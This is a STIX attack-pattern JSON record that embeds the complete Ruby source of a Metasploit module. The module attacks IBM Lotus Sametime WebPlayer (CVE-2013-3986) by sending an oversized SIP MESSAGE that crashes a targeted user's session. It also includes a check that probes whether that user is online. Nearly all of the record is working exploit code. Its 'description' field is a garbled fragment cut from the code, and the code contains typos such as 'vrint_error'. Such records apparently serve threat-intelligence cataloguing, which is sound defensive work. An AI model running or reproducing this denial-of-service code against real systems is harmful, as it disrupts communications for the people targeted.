{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3ea9ee8-1d54-4e80-afc3-295c6d67efa1",
    "created": "2024-08-14T16:24:52.977564Z",
    "modified": "2024-08-14T16:24:52.977568Z",
    "name": "IBM Lotus Sametime WebPlayer DoS",
    "description": "Checking if targeted user is online  ] ] 'DefaultAction'  => 'DOS' 'References'   => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/misc/ibm_sametime_webplayer_dos.rb",
            "external_id": "ibm_sametime_webplayer_dos.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21654041"
        },
        {
            "source_name": "reference",
            "url": "http://xforce.iss.net/xforce/xfdb/84969"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'       => 'IBM Lotus Sametime WebPlayer DoS',\n      'Description'  => %q{\n        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer\n        version 8.5.2.1392 (and prior) to cause a denial of service condition\n        against specific users. For this module to function the target user\n        must be actively logged into the IBM Lotus Sametime server and have\n        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a\n        browser extension. The user should have the WebPlayer plug-in active\n        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.\n      },\n      'Author'     =>\n        [\n          'Chris John Riley', # Vulnerability discovery\n          'kicks4kittens' # Metasploit module\n        ],\n      'License'    => MSF_LICENSE,\n      'Actions'    =>\n        [\n          ['DOS',\n            {\n              'Description' => 'Cause a Denial Of Service condition against a connected user'\n            }\n          ],\n          ['CHECK',\n            {\n              'Description' => 'Checking if targeted user is online'\n            }\n          ]\n        ],\n      'DefaultAction'  => 'DOS',\n      'References'   =>\n        [\n          [ 'CVE', '2013-3986' ],\n          [ 'OSVDB', '99552' ],\n          [ 'BID', '63611'],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],\n          [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]\n        ],\n      'DisclosureDate' => '2013-11-07'))\n\n    register_options(\n      [\n        Opt::RPORT(5060),\n        OptAddress.new('RHOST', [true, 'The Sametime Media Server']),\n        OptString.new('SIPURI', [\n          true,\n          'The SIP URI of the user to be targeted',\n          '<target_email_address>@<sametime_media_server_FQDN>'\n        ]),\n        OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])\n      ])\n\n  end\n\n  def setup\n    # cleanup SIP target to ensure it's in the correct format to use\n    @sipuri = datastore['SIPURI']\n    if @sipuri[0, 4].downcase == \"sip:\"\n      # remove sip: if present in string\n      @sipuri = @sipuri[4, @sipuri.length]\n    end\n    if @sipuri[0, 12].downcase == \"webavclient-\"\n      # remove WebAVClient- if present in string\n      @sipuri = @sipuri[12, @sipuri.length]\n    end\n  end\n\n  def run\n    # inform user of action currently selected\n    print_status(\"Action: #{action.name} selected\")\n\n    # CHECK action\n    if action.name == 'CHECK'\n      print_status(\"Checking if user #{@sipuri} is online\")\n      if check_user\n        print_good(\"User online\")\n      else\n        print_status(\"User offline\")\n      end\n      return\n    end\n\n    # DOS action\n    print_status(\"Checking if user #{@sipuri} is online\")\n    check_result = check_user\n\n    if check_result == false\n      print_error(\"User is already offline... Exiting...\")\n      return\n    end\n\n    # only proceed if action is DOS the target user is\n    # online or the CHECKUSER option has been disabled\n    print_status(\"Targeting user: #{@sipuri}...\")\n    dos_result = dos_user\n\n    if dos_result\n      print_good(\"User is offline, DoS was successful\")\n    else\n      print_error(\"User is still online\")\n    end\n\n  end\n\n  def dos_user\n    length = 12000 # enough to overflow the end of allocated memory\n    msg = create_message(length)\n    res = send_msg(msg)\n\n    if res.nil?\n      vprint_good(\"User #{@sipuri} is no responding\")\n      return true\n    elsif res =~ /430 Flow Failed/i\n      vprint_good(\"DoS packet successful. Response received (430 Flow Failed)\")\n      vprint_good(\"User #{@sipuri} is no longer responding\")\n      return true\n    elsif res =~ /404 Not Found/i\n      vprint_error(\"DoS packet appears successful. Response received (404 Not Found)\")\n      vprint_status(\"User appears to be currently offline or not in a Sametime video session\")\n      return true\n    elsif res =~ /200 OK/i\n      vrint_error(\"#{peer} - DoS packet unsuccessful. Response received (200)\")\n      vrint_status(\"#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer\")\n      return false\n    else\n      vprint_status(\"Unexpected response\")\n      return true\n    end\n  end\n\n  # used to check the user is logged into Sametime and after DoS to check success\n  def check_user\n    length = Rex::Text.rand_text_numeric(2) # just enough to check response\n    msg = create_message(length)\n    res = send_msg(msg)\n\n    # check response for current user status - common return codes\n    if res.nil?\n      vprint_error(\"No response\")\n      return false\n    elsif res =~ /430 Flow Failed/i\n      vprint_good(\"User #{@sipuri} is no longer responding (already DoS'd?)\")\n      return false\n    elsif res =~ /404 Not Found/i\n      vprint_error(\"User #{@sipuri} is currently offline or not in a Sametime video session\")\n      return false\n    elsif res =~ /200 OK/i\n      vprint_good(\"User #{@sipuri} is online\")\n      return true\n    else\n      vprint_error(\"Unknown server response\")\n      return false\n    end\n  end\n\n  def create_message(length)\n    # create SIP MESSAGE of specified length\n    vprint_status(\"Creating SIP MESSAGE packet #{length} bytes long\")\n\n    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)\n    source_host = Rex::Socket.source_address(datastore['RHOST'])\n    src = \"#{source_host}:#{datastore['RPORT']}\"\n    cseq = Rex::Text.rand_text_numeric(3)\n    message_text = Rex::Text.rand_text_alphanumeric(length.to_i)\n    branch = Rex::Text.rand_text_alphanumeric(7)\n\n    # setup SIP message in the correct format expected by the server\n    data =  \"MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0\" + \"\\r\\n\"\n    data << \"Via: SIP/2.0/TCP #{src};branch=#{branch}.#{\"%.8x\" % rand(0x100000000)};rport;alias\" + \"\\r\\n\"\n    data << \"Max-Forwards: 80\\r\\n\"\n    data << \"To: sip:WebAVClient-#{@sipuri}\" + \"\\r\\n\"\n    data << \"From: sip:#{source_user}@#{src};tag=70c00e8c\" + \"\\r\\n\"\n    data << \"Call-ID: #{rand(0x100000000)}@#{source_host}\" + \"\\r\\n\"\n    data << \"CSeq: #{cseq} MESSAGE\" + \"\\r\\n\"\n    data << \"Content-Type: text/plain;charset=utf-8\" + \"\\r\\n\"\n    data << \"User-Agent: #{source_user}\\r\\n\"\n    data << \"Content-Length: #{message_text.length}\" + \"\\r\\n\\r\\n\"\n    data << message_text\n\n    return data\n  end\n\n  def timing_get_once(s, length)\n    if datastore['TIMEOUT'] and datastore['TIMEOUT'] > 0\n      return s.get_once(length, datastore['TIMEOUT'])\n    else\n      return s.get_once(length)\n    end\n  end\n\n  def send_msg(msg)\n    begin\n      s = connect\n      # send message and store response\n      s.put(msg + \"\\r\\n\\r\\n\") rescue nil\n      # read response\n      res = timing_get_once(s, 25)\n      if res == \"\\r\\n\"\n        # retry request\n        res = timing_get_once(s, 25)\n      end\n      return res\n    rescue ::Rex::ConnectionRefused\n      print_status(\"Unable to connect\")\n      return nil\n    rescue ::Errno::ECONNRESET\n      print_good(\"DoS packet successful, host not responding.\")\n      return nil\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Couldn't connect\")\n      return nil\n    ensure\n      # disconnect socket if still open\n      disconnect if s\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-07"
}